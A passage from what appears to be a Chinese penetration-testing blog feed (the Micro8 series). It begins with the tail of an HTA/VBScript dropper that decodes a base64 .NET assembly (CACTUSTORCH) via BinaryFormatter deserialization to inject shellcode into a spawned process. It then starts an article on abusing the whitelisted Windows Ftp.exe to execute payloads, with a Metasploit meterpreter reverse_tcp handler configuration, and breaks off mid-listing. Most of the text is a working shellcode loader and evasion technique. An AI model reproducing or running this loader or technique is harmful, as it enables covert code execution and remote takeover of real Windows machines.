&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT&quot;</span><br><span class="line">s = s &amp; &quot;MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA&quot;</span><br><span class="line">s = s &amp; &quot;Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME&quot;</span><br><span class="line">s = s &amp; &quot;EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK&quot;</span><br><span class="line">s = s &amp; &quot;ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK&quot;</span><br><span class="line">s = s &amp; &quot;EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA&quot;</span><br><span class="line">s = s &amp; &quot;BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC&quot;</span><br><span class="line">s = s &amp; &quot;fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP&quot;</span><br><span class="line">s = s &amp; &quot;AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj&quot;</span><br><span class="line">s = s &amp; &quot;fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB&quot;</span><br><span class="line">s = s &amp; &quot;AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA&quot;</span><br><span class="line">s = s &amp; &quot;ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF&quot;</span><br><span class="line">s = s &amp; &quot;kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG&quot;</span><br><span class="line">s = s &amp; &quot;AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I&quot;</span><br><span class="line">s = s &amp; &quot;qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK&quot;</span><br><span class="line">s = s &amp; &quot;ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB&quot;</span><br><span class="line">s = s &amp; &quot;AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG&quot;</span><br><span class="line">s = s &amp; &quot;AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB&quot;</span><br><span class="line">s = s &amp; &quot;AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW&quot;</span><br><span class="line">s = s &amp; &quot;gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD&quot;</span><br><span class="line">s = s &amp; &quot;AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG&quot;</span><br><span class="line">s = s &amp; &quot;ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I&quot;</span><br><span class="line">s = s &amp; &quot;+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW&quot;</span><br><span class="line">s = s &amp; &quot;gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA&quot;</span><br><span class="line">s = s &amp; &quot;EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW&quot;</span><br><span class="line">s = s &amp; &quot;IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg&quot;</span><br><span class="line">s = s &amp; &quot;1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+&quot;</span><br><span class="line">s = s &amp; &quot;BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA&quot;</span><br><span class="line">s = s &amp; &quot;BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA&quot;</span><br><span class="line">s = s &amp; &quot;AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA&quot;</span><br><span class="line">s = s &amp; &quot;CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB&quot;</span><br><span class="line">s = s &amp; &quot;AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG&quot;</span><br><span class="line">s = s &amp; &quot;KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ&quot;</span><br><span class="line">s = s &amp; &quot;ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA&quot;</span><br><span class="line">s = s &amp; &quot;hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ&quot;</span><br><span class="line">s = s &amp; &quot;AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA&quot;</span><br><span class="line">s = s &amp; &quot;5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ&quot;</span><br><span class="line">s = s &amp; &quot;AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB&quot;</span><br><span class="line">s = s &amp; &quot;aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu&quot;</span><br><span class="line">s = s &amp; &quot;ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA&quot;</span><br><span class="line">s = s &amp; &quot;WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB&quot;</span><br><span class="line">s = s &amp; &quot;AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA&quot;</span><br><span class="line">s = s &amp; &quot;AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN&quot;</span><br><span class="line">s = s &amp; &quot;b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S&quot;</span><br><span class="line">s = s &amp; &quot;RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU&quot;</span><br><span class="line">s = s &amp; &quot;RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP&quot;</span><br><span class="line">s = s &amp; &quot;TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB&quot;</span><br><span class="line">s = s &amp; &quot;VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF&quot;</span><br><span class="line">s = s &amp; &quot;VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT&quot;</span><br><span class="line">s = s &amp; &quot;X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP&quot;</span><br><span class="line">s = s &amp; &quot;VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP&quot;</span><br><span class="line">s = s &amp; &quot;UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ&quot;</span><br><span class="line">s = s &amp; &quot;VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU&quot;</span><br><span class="line">s = s &amp; &quot;WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD&quot;</span><br><span class="line">s = s &amp; &quot;UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP&quot;</span><br><span class="line">s = s &amp; &quot;Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J&quot;</span><br><span class="line">s = s &amp; &quot;Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X&quot;</span><br><span class="line">s = s &amp; &quot;SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO&quot;</span><br><span class="line">s = s &amp; &quot;SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy&quot;</span><br><span class="line">s = s &amp; &quot;ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs&quot;</span><br><span class="line">s = s &amp; &quot;cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl&quot;</span><br><span class="line">s = s &amp; &quot;cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW&quot;</span><br><span class="line">s = s &amp; &quot;YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1&quot;</span><br><span class="line">s = s &amp; &quot;dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh&quot;</span><br><span class="line">s = s &amp; &quot;ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli&quot;</span><br><span class="line">s = s &amp; &quot;dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0&quot;</span><br><span class="line">s = s &amp; &quot;cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz&quot;</span><br><span class="line">s = s &amp; &quot;ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5&quot;</span><br><span class="line">s = s &amp; &quot;Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3&quot;</span><br><span class="line">s = s &amp; &quot;WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI&quot;</span><br><span class="line">s = s &amp; &quot;RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n&quot;</span><br><span class="line">s = s &amp; &quot;AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD&quot;</span><br><span class="line">s = s &amp; &quot;VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz&quot;</span><br><span class="line">s = s &amp; &quot;SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ&quot;</span><br><span class="line">s = s &amp; &quot;bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT&quot;</span><br><span class="line">s = s &amp; &quot;ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt&quot;</span><br><span class="line">s = s &amp; &quot;ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp&quot;</span><br><span class="line">s = s &amp; &quot;bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp&quot;</span><br><span class="line">s = s &amp; &quot;YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh&quot;</span><br><span class="line">s = s &amp; &quot;Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU&quot;</span><br><span class="line">s = s &amp; &quot;ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB&quot;</span><br><span class="line">s = s &amp; &quot;ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk&quot;</span><br><span class="line">s = s &amp; &quot;SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ&quot;</span><br><span class="line">s = s &amp; &quot;cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX&quot;</span><br><span class="line">s = s &amp; &quot;AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE&quot;</span><br><span class="line">s = s &amp; &quot;IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD&quot;</span><br><span class="line">s = s &amp; &quot;Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE&quot;</span><br><span class="line">s = s &amp; &quot;IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA&quot;</span><br><span class="line">s = s &amp; &quot;AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg&quot;</span><br><span class="line">s = s &amp; &quot;BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS&quot;</span><br><span class="line">s = s &amp; &quot;DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB&quot;</span><br><span class="line">s = s &amp; &quot;AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT&quot;</span><br><span class="line">s = s &amp; &quot;VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3&quot;</span><br><span class="line">s = s &amp; &quot;NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA&quot;</span><br><span class="line">s = s &amp; &quot;ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A&quot;</span><br><span class="line">s = s &amp; &quot;VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA&quot;</span><br><span class="line">s = s &amp; &quot;BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs&quot;</span><br><span class="line">s = s &amp; &quot;AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA&quot;</span><br><span class="line">s = s &amp; &quot;cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA&quot;</span><br><span class="line">s = s &amp; &quot;UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu&quot;</span><br><span class="line">s = s &amp; &quot;ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA&quot;</span><br><span class="line">s = s &amp; &quot;SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV&quot;</span><br><span class="line">s = s &amp; &quot;AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP&quot;</span><br><span class="line">s = s &amp; &quot;AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA&quot;</span><br><span class="line">s = s &amp; &quot;VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw&quot;</span><br><span class="line">s = s &amp; &quot;AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA&quot;</span><br><span class="line">s = s &amp; &quot;LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv&quot;</span><br><span class="line">s = s &amp; &quot;bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;</span><br><span class="line">entry_class = &quot;cactusTorch&quot;</span><br><span class="line"></span><br><span class="line">Dim fmt, al, d, o</span><br><span class="line">Set fmt = CreateObject(&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;)</span><br><span class="line">Set al = CreateObject(&quot;System.Collections.ArrayList&quot;)</span><br><span class="line">al.Add fmt.SurrogateSelector</span><br><span class="line"></span><br><span class="line">Set d = fmt.Deserialize_2(Base64ToStream(s))</span><br><span class="line">Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)</span><br><span class="line">o.flame binary,code</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">SetVersion</span><br><span class="line">On Error Resume Next</span><br><span class="line">Run</span><br><span class="line">If Err.Number &lt;&gt; 0 Then</span><br><span class="line">Debug Err.Description</span><br><span class="line">Err.Clear</span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>88、基于白名单Ftp.exe执行payload第十九季</title>
      <link href="/article/88_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%AD%A3.html"/>
      <url>/article/88_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="Ftp-exe简介："><a href="#Ftp-exe简介：" class="headerlink" title="Ftp.exe简介："></a>Ftp.exe简介：</h3><p>Ftp.exe是Windows本身自带的一个程序，属于微软FTP工具，提供基本的FTP访问。</p><p><strong>说明：</strong>Ftp.exe所在路径已被系统添加PATH环境变量中，因此，Ftp.exe命令可识别。</p><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\ftp.exe</span><br><span class="line">C:\Windows\SysWOW64\ftp.exe</span><br></pre></td></tr></table></figure><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\ftp.exe</span><br><span class="line">C:\Windows\SysWOW64\ftp.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><strong>注：</strong>需设置参数<br><code>set AutoRunScript migrate -f</code>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line"></span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf 